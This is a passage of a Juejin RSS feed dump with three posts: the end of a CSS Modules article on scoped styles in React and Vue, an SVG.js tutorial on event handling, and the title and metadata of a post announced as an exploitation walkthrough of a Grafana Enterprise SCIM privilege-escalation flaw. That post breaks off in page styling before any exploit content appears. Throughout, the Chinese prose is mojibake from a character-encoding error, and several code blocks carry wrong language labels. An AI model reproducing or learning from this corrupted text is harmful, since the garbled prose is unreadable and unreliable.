<li>
<p>æ„å»ºåï¼Œå®é™…ç”Ÿæˆçš„ HTML å¯èƒ½æ˜¯ï¼š</p>
<p>html</p>
<pre><code class="hljs language-ini" lang="ini">&lt;button <span class="hljs-attr">class</span>=<span class="hljs-string">"Button_button__abc123"</span>&gt;Click Me&lt;/button&gt;
</code></pre>
</li>
</ol>
<p>å…¶ä¸­Â <code>__abc123</code>Â æ˜¯ Webpack æˆ– Vite è‡ªåŠ¨ç”Ÿæˆçš„å“ˆå¸Œåç¼€ï¼Œç¡®ä¿<strong>å³ä½¿å¤šä¸ªç»„ä»¶éƒ½å®šä¹‰äº†Â <code>.button</code>ï¼Œä¹Ÿä¸ä¼šäº’ç›¸å¹²æ‰°</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-3">ä¸‰ã€React/Vue å¦‚ä½•å®ç°æ ·å¼ä½œç”¨åŸŸï¼Ÿ</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3b05554e77e4d35ba22e44bf428e4c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg5pWM55qE5ouW5ouJ5pav5peL6aOO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541143&amp;x-signature=QoAhB08GtEPfxcRo%2FmfQ1vQ8d3A%3D" alt="vue-css-demo.png" loading="lazy"/>
è¡¨æ ¼</p>

















<table><thead><tr><th>æ¡†æ¶</th><th>å®ç°æ–¹å¼</th></tr></thead><tbody><tr><td><strong>React</strong></td><td>é€šè¿‡æ„å»ºå·¥å…·ï¼ˆå¦‚ Webpackã€Viteï¼‰æ”¯æŒÂ <code>*.module.css</code>ï¼Œè‡ªåŠ¨é‡å‘½åç±»å</td></tr><tr><td><strong>Vue</strong></td><td>åœ¨å•æ–‡ä»¶ç»„ä»¶ï¼ˆSFCï¼‰ä¸­ä½¿ç”¨Â <code>&lt;style scoped&gt;</code>ï¼Œç¼–è¯‘æ—¶ä¸ºæ¯ä¸ªå…ƒç´ æ·»åŠ å”¯ä¸€Â <code>data-v-xxx</code>Â å±æ€§ï¼Œå¹¶é™å®š CSS é€‰æ‹©å™¨</td></tr></tbody></table>
<p>ä¸¤è€…æ®Šé€”åŒå½’ï¼š<strong>å°†æ ·å¼é™åˆ¶åœ¨ç»„ä»¶å†…éƒ¨ï¼Œä¸æ±¡æŸ“å…¨å±€ï¼Œä¹Ÿä¸å—å¤–ç•Œå½±å“</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-4">å››ã€CSS Modules çš„æ ¸å¿ƒä¼˜åŠ¿</h2>
<h3 data-id="heading-5">1.Â <strong>æ ·å¼éš”ç¦»ï¼ˆIsolationï¼‰</strong></h3>
<ul>
<li>ç»„ä»¶ A çš„Â <code>.title</code>Â ä¸ä¼šå½±å“ç»„ä»¶ B çš„Â <code>.title</code></li>
<li>å½»åº•å‘Šåˆ«â€œæ ·å¼è¦†ç›–â€å’Œâ€œæ„å¤–ç»§æ‰¿â€</li>
</ul>
<h3 data-id="heading-6">2.Â <strong>å¯é¢„æµ‹æ€§ï¼ˆPredictabilityï¼‰</strong></h3>
<ul>
<li>ä½ å†™çš„æ ·å¼å°±æ˜¯æœ€ç»ˆç”Ÿæ•ˆçš„æ ·å¼</li>
<li>ä¸å†éœ€è¦çŒœæµ‹â€œå“ªä¸ª CSS æ–‡ä»¶æœ€ååŠ è½½ï¼Ÿâ€</li>
</ul>
<h3 data-id="heading-7">3.Â <strong>å®‰å…¨å…±äº«ï¼ˆSafe Sharingï¼‰</strong></h3>
<ul>
<li>å¼€æºç»„ä»¶åº“ï¼ˆå¦‚ Ant Designã€Material UIï¼‰å¯æ”¾å¿ƒä½¿ç”¨ CSS Modules</li>
<li>å¤šäººåä½œæ—¶ï¼Œæ— éœ€åè°ƒå‘½åè§„èŒƒ</li>
</ul>
<h3 data-id="heading-8">4.Â <strong>Tree-shaking å‹å¥½</strong></h3>
<ul>
<li>æœªä½¿ç”¨çš„ CSS ç±»åœ¨æ„å»ºæ—¶å¯è¢«è‡ªåŠ¨ç§»é™¤ï¼ˆé…åˆ PurgeCSS ç­‰å·¥å…·ï¼‰</li>
</ul>
<hr/>
<h2 data-id="heading-9">äº”ã€è¿›é˜¶æŠ€å·§ï¼šç»„åˆä¸å¤ç”¨</h2>
<p>è™½ç„¶ CSS Modules å¼ºè°ƒéš”ç¦»ï¼Œä½†å¹¶ä¸æ„å‘³ç€ä¸èƒ½å¤ç”¨ã€‚</p>
<h3 data-id="heading-10">ä½¿ç”¨Â <code>composes</code>ï¼ˆè¾ƒå°‘ç”¨ï¼‰</h3>
<p>css</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* base.module.css */</span>
<span class="hljs-selector-class">.primary</span> {
  <span class="hljs-attribute">background</span>: blue;
  <span class="hljs-attribute">color</span>: white;
}

<span class="hljs-comment">/* Button.module.css */</span>
<span class="hljs-selector-class">.btn</span> {
  composes: primary from <span class="hljs-string">'./base.module.css'</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;
}
</code></pre>
<h3 data-id="heading-11">æ›´æ¨èï¼šé€šè¿‡ props æ§åˆ¶å˜ä½“</h3>
<p>jsx</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Button.jsx</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Button</span>(<span class="hljs-params">{ variant = <span class="hljs-string">'default'</span> }</span>) {
  <span class="hljs-keyword">const</span> className = variant === <span class="hljs-string">'primary'</span> 
    ? <span class="hljs-string">`<span class="hljs-subst">${styles.button}</span> <span class="hljs-subst">${styles.primary}</span>`</span> 
    : styles.<span class="hljs-property">button</span>;
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{className}</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;
}
</code></pre>
<p>æˆ–è€…ç»“åˆÂ <strong>Tailwind CSS</strong>Â ç­‰åŸå­åŒ–æ–¹æ¡ˆï¼Œå®ç°æ›´çµæ´»çš„æ ·å¼ç»„åˆã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4aeb4deb4fed42179bf6f30564e192ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg5pWM55qE5ouW5ouJ5pav5peL6aOO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541143&amp;x-signature=VvDzwPoNz55c%2BR%2BX3XiTcc1Nd%2F0%3D" alt="styled-components.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-12">å…­ã€ä½•æ—¶ä¸è¯¥ç”¨ CSS Modulesï¼Ÿ</h2>
<ul>
<li>
<p><strong>å…¨å±€æ ·å¼</strong>ï¼ˆå¦‚ resetã€å­—ä½“ã€å¸ƒå±€å®¹å™¨ï¼‰â†’ åº”æ”¾åœ¨Â <code>globals.css</code></p>
</li>
<li>
<p><strong>ä¸»é¢˜åˆ‡æ¢</strong>Â â†’ å¯é…åˆ CSS å˜é‡ï¼ˆ<code>--primary-color</code>ï¼‰å®ç°</p>
</li>
<li>
<p><strong>åŠ¨æ€ç±»å</strong>ï¼ˆå¦‚Â <code>class={isActive ? 'active' : ''}</code>ï¼‰â†’ ä»å¯ç”¨ï¼Œä½†éœ€æ³¨æ„æ¨¡å—åŒ–å†™æ³•ï¼š</p>
<p>jsx</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">className</span>={`<span class="hljs-variable">${styles.button}</span> <span class="hljs-variable">${isActive ? styles.active : ''}</span>`}
</code></pre>
</li>
</ul>
<hr/>
<h2 data-id="heading-13">ç»“è¯­ï¼šä»â€œç®¡ç†æ··ä¹±â€åˆ°â€œå®‰å¿ƒç¼–ç â€</h2>
<p>CSS Modules å¹¶ä¸æ˜¯é“¶å¼¹ï¼Œä½†å®ƒä»£è¡¨äº†ä¸€ç§é‡è¦çš„å·¥ç¨‹æ€æƒ³ï¼š</p>
<blockquote>
<p><strong>å°†å‰¯ä½œç”¨æœ€å°åŒ–ï¼Œè®©ç»„ä»¶çœŸæ­£æˆä¸ºâ€œè‡ªåŒ…å«â€çš„å•å…ƒã€‚</strong></p>
</blockquote>
<p>åœ¨å¾®å‰ç«¯ã€ç»„ä»¶åº“ã€å¤šäººåä½œç­‰åœºæ™¯ä¸‹ï¼Œè¿™ç§â€œæ ·å¼å®‰å…¨è¾¹ç•Œâ€æ˜¾å¾—å°¤ä¸ºçè´µã€‚<br/>
å®ƒè®©æˆ‘ä»¬å¯ä»¥åƒå†™å‡½æ•°ä¸€æ ·å†™ç»„ä»¶â€”â€”è¾“å…¥ propsï¼Œè¾“å‡º UIï¼Œ<strong>æ— éœ€æ‹…å¿ƒå¤–éƒ¨ä¸–ç•Œçš„å¹²æ‰°</strong>ã€‚</p>
<p>æ­£å¦‚ä¸€å¥å‰ç«¯æ ¼è¨€æ‰€è¯´ï¼š</p>
<blockquote>
<p>â€œå¥½çš„ç»„ä»¶ï¼Œè¿å®ƒçš„æ ·å¼éƒ½åº”è¯¥æ˜¯ç§æœ‰çš„ã€‚â€</p>
</blockquote>
<p>è€Œ CSS Modulesï¼Œæ­£æ˜¯å®ç°è¿™ä¸€ç†æƒ³çš„åšå®åŸºçŸ³ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SVGå­¦ä¹ ï¼ˆäº”ï¼‰]]></title>    <link>https://juejin.cn/post/7592876744527298610</link>    <guid>https://juejin.cn/post/7592876744527298610</guid>    <pubDate>2026-01-09T03:52:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592876744527298610" data-draft-id="7592903126178349106" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SVGå­¦ä¹ ï¼ˆäº”ï¼‰"/> <meta itemprop="keywords" content="å‰ç«¯,SVG"/> <meta itemprop="datePublished" content="2026-01-09T03:52:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è°œäºšæ˜Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/2752832848537944"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SVGå­¦ä¹ ï¼ˆäº”ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2752832848537944/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è°œäºšæ˜Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:52:26.000Z" title="Fri Jan 09 2026 03:52:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨svg.jsä¸­ï¼Œç»™å…ƒç´ ç»‘å®šäº‹ä»¶ï¼Œä¹Ÿå’Œhtmlä¸­ä¸€æ ·ï¼Œâ€œå…ƒç´ .äº‹ä»¶åâ€å°±è¡Œï¼Œè€Œä¸”ä¹Ÿæ”¯æŒclickï¼Œmouseoverç­‰å¤šç§äº‹ä»¶ï¼Œä¾‹å¦‚</p>
<pre><code class="hljs language-javascript" lang="javascript">element.<span class="hljs-title function_">click</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">fill</span>({ <span class="hljs-attr">color</span>: <span class="hljs-string">'#f06'</span> })
})
</code></pre>
<p>å…¶ä¸­çš„thiså°±æŒ‡å‘å½“å‰å…ƒç´ ã€‚ä¸è¿‡è¦æ³¨æ„ï¼Œsvgæœ¬èº«æ˜¯ä¸æ”¯æŒscrollæ»šåŠ¨çš„ã€‚</p>
<p>å¦‚æœæƒ³ç§»é™¤äº‹ä»¶ï¼Œå°±å°†äº‹ä»¶è®¾ç½®ä¸ºnullå°±è¡Œ</p>
<pre><code class="hljs language-csharp" lang="csharp">element.click(<span class="hljs-literal">null</span>)
</code></pre>
<p>å¯¹äºè§¦å‘äº‹ä»¶ï¼Œsvg.jsæœ‰ä¸¤ç§æ–¹å¼ï¼Œfireå’Œdispatchï¼Œä¸¤è€…éƒ½å¯ä»¥ä¼ é€’ç¬¬äºŒä¸ªå‚æ•°æ¥ä¼ å‚ï¼ŒåŒºåˆ«åœ¨äºè¿”å›å€¼ã€‚fireçš„è¿”å›å€¼æ˜¯å½“å‰å…ƒç´ ï¼Œdispatchæ˜¯äº‹ä»¶eventå¯¹è±¡</p>
<p>ç›‘å¬äº‹ä»¶å’Œhtmlä¸­ä¸€æ ·ï¼Œä½¿ç”¨onæ–¹æ³•</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">click</span> = <span class="hljs-selector-tag">function</span>() {
  <span class="hljs-selector-tag">this</span><span class="hljs-selector-class">.fill</span>({ <span class="hljs-attribute">color</span>: <span class="hljs-string">'#f06'</span> })
}
element.<span class="hljs-built_in">on</span>(<span class="hljs-string">'click'</span>, click)
element.<span class="hljs-built_in">fire</span>(<span class="hljs-string">'click'</span>)
element.<span class="hljs-built_in">dispatch</span>(<span class="hljs-string">'click'</span>)
</code></pre>
<p>å¯ä»¥åŒæ—¶ç›‘å¬å¤šä¸ªäº‹ä»¶</p>
<pre><code class="hljs language-csharp" lang="csharp">element.<span class="hljs-keyword">on</span>([<span class="hljs-string">'click'</span>, <span class="hljs-string">'mouseover'</span>], handler)
element.<span class="hljs-keyword">on</span>(<span class="hljs-string">'click mouseover'</span>, handler)
</code></pre>
<p>ä¹Ÿå¯ä»¥æ”¹å˜å‡½æ•°ä¸­thisçš„æŒ‡å‘</p>
<pre><code class="hljs language-dart" lang="dart">element.<span class="hljs-keyword">on</span>(<span class="hljs-string">'click'</span>, click, <span class="hljs-built_in">window</span>)
</code></pre>
<p>äº‹ä»¶ä½“å‡½æ•°ä¸­ä¹Ÿæœ‰eventäº‹ä»¶å¯¹è±¡</p>
<p>å–æ¶ˆç»‘å®šäº‹ä»¶åŒæ ·ç®€å•ï¼šÂ </p>
<pre><code class="hljs language-arduino" lang="arduino">element.<span class="hljs-built_in">off</span>(<span class="hljs-string">'click'</span>, click) 
</code></pre>
<p>æˆ–è€…å–æ¶ˆç»‘å®šç‰¹å®šç±»å‹çš„äº‹ä»¶ç›‘å¬å™¨ï¼šÂ </p>
<pre><code class="hljs language-vbnet" lang="vbnet">element.<span class="hljs-keyword">off</span>(<span class="hljs-comment">'click') </span>
</code></pre>
<p>æˆ–è€…å¤šä¸ªäº‹ä»¶ç±»å‹ï¼šÂ </p>
<pre><code class="hljs language-vbnet" lang="vbnet">element.<span class="hljs-keyword">off</span>([<span class="hljs-comment">'click', 'mouseover'])</span>
element.<span class="hljs-keyword">off</span>(<span class="hljs-comment">'click mouseover') </span>
</code></pre>
<p>ç”šè‡³å¯ä»¥å–æ¶ˆç»‘å®šæ‰€æœ‰äº‹ä»¶çš„ç›‘å¬å™¨ï¼šÂ </p>
<pre><code class="hljs language-scss" lang="scss">element<span class="hljs-selector-class">.off</span>()
</code></pre>
<p>æœ‰äº†ä¸Šé¢è¿™äº›ï¼Œå°±å¯ä»¥è‡ªå®šä¹‰äº‹ä»¶ä½¿ç”¨äº†</p>
<pre><code class="hljs language-javascript" lang="javascript">element.<span class="hljs-title function_">on</span>(<span class="hljs-string">'myevent'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-title function_">alert</span>(<span class="hljs-string">'ta-da!'</span>)
})
<span class="hljs-keyword">function</span> <span class="hljs-title function_">whenSomethingHappens</span>(<span class="hljs-params"/>) {
  element.<span class="hljs-title function_">fire</span>(<span class="hljs-string">'myevent'</span>)
}
</code></pre>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œsvg.jsä¹Ÿå¯ä»¥åœ¨å…¶ä»–å…ƒç´ ä¸Šç»‘å®šäº‹ä»¶</p>
<pre><code class="hljs language-dart" lang="dart">SVG.<span class="hljs-keyword">on</span>(<span class="hljs-built_in">window</span>, <span class="hljs-string">'click'</span>, click)
SVG.off(<span class="hljs-built_in">window</span>, <span class="hljs-string">'click'</span>, click)
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥å‰–æCVE-2025-41115ï¼šGrafanaä¼ä¸šç‰ˆSCIMç‰¹æƒå‡çº§æ¼æ´åˆ©ç”¨å®è·µ]]></title>    <link>https://juejin.cn/post/7592846242176712738</link>    <guid>https://juejin.cn/post/7592846242176712738</guid>    <pubDate>2026-01-09T03:30:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592846242176712738" data-draft-id="7592846242176696354" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥å‰–æCVE-2025-41115ï¼šGrafanaä¼ä¸šç‰ˆSCIMç‰¹æƒå‡çº§æ¼æ´åˆ©ç”¨å®è·µ"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,AIGC"/> <meta itemprop="datePublished" content="2026-01-09T03:30:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="qife122"/> <meta itemprop="url" content="https://juejin.cn/user/1743174852185579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥å‰–æCVE-2025-41115ï¼šGrafanaä¼ä¸šç‰ˆSCIMç‰¹æƒå‡çº§æ¼æ´åˆ©ç”¨å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1743174852185579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    qife122
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:30:21.000Z" title="Fri Jan 09 2026 03:30:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag 